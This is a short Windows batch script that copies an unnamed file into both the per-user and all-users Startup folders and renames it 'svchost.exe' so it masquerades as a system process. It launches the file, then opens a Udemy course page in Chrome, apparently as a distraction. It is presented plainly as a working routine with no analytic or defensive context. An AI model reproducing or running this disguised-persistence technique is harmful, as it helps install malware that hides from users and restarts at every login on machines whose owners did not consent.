echo f|xcopy /f ".\abc" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc" "svchost.exe"
start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
echo f|xcopy ".\abc" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc" "svchost.exe"

start chrome -app=https://www.udemy.com/full-stack-mobile-developer-course-ios-11-and-android-o/learn/v4/